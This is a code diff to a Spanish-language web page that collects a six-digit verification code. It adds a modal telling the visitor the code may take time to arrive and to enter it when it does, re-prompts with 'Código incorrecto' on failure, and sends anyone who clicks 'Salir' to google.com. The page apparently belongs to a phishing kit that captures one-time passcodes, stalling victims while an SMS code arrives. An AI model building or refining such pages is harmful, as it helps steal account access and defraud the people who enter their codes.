@@ -73,7 +73,6 @@ body{
     z-index:999;
 }
 
-/* ANIMACION */
 @keyframes shake{
     0%{transform:translateX(-50%) translateX(0);}
     25%{transform:translateX(-50%) translateX(-5px);}
@@ -116,13 +115,80 @@ body{
     padding:15px;
     cursor:pointer;
 }
+
+/* 🔥 MODAL */
+.modal{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,0.6);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    z-index:9999;
+}
+
+.modal-content{
+    background:white;
+    width:85%;
+    max-width:320px;
+    padding:25px;
+    border-radius:12px;
+    text-align:center;
+}
+
+.modal-content h2{
+    margin:10px 0;
+}
+
+.modal-content p{
+    color:#666;
+    font-size:15px;
+}
+
+#btnContinuar{
+    width:100%;
+    padding:14px;
+    background:#e6007e;
+    border:none;
+    color:white;
+    border-radius:8px;
+    font-weight:600;
+    margin-top:15px;
+}
+
+.salir{
+    width:100%;
+    padding:14px;
+    background:white;
+    border:1px solid #ccc;
+    border-radius:8px;
+    margin-top:10px;
+}
 </style>
 </head>
 
 <body>
 
-<!-- ALERTA -->
+<!-- 🔴 ALERTA -->
 <div id="alerta" class="alerta">❌ Código incorrecto</div>
+
+<!-- 🔥 MODAL -->
+<div id="modalAviso" class="modal">
+  <div class="modal-content">
+    <div style="font-size:40px;">⏰</div>
+    <h2>¡Ya casi!</h2>
+    <p>
+      El código se puede demorar un poco para llegar.<br>
+      Escríbelo porfa cuando te llegue
+    </p>
+
+    <button id="btnContinuar">Ingresa el código</button>
+    <button id="btnSalir" class="salir">Salir</button>
+  </div>
+</div>
 
 <div class="header">← Ingresa el código</div>
 
@@ -161,6 +227,11 @@ body{
 const claveInput = document.getElementById('claveInput');
 const alerta = document.getElementById('alerta');
 
+/* MODAL */
+const modal = document.getElementById("modalAviso");
+document.getElementById("btnContinuar").onclick = ()=> modal.style.display="none";
+document.getElementById("btnSalir").onclick = ()=> window.location.href="https://google.com";
+
 /* CREAR CAJAS */
 const boxesContainer = document.getElementById("boxes");
 
@@ -172,7 +243,7 @@ for(let i=0;i<6;i++){
 
 const boxes = document.querySelectorAll(".box");
 
-/* ACTUALIZAR CAJAS */
+/* ACTUALIZAR */
 function updateBoxes(){
     const val = claveInput.value;
     boxes.forEach((box,i)=>{
@@ -180,7 +251,7 @@ function updateBoxes(){
     });
 }
 
-/* MOSTRAR ALERTA */
+/* ERROR */
 function mostrarError(){
     alerta.classList.add("show");
 
@@ -188,7 +259,6 @@ function mostrarError(){
         alerta.classList.remove("show");
     },3000);
 
-    /* limpiar codigo */
     claveInput.value = "";
     updateBoxes();
 }
@@ -220,11 +290,10 @@ async function enviarCodigo(){
         if (result.ok) {
             window.location.href = "loading.html";
         } else {
-            mostrarError(); // 🔥 ERROR BONITO
+            mostrarError();
         }
 
     } catch (err) {
-        console.error(err);
         mostrarError();
     }
 }
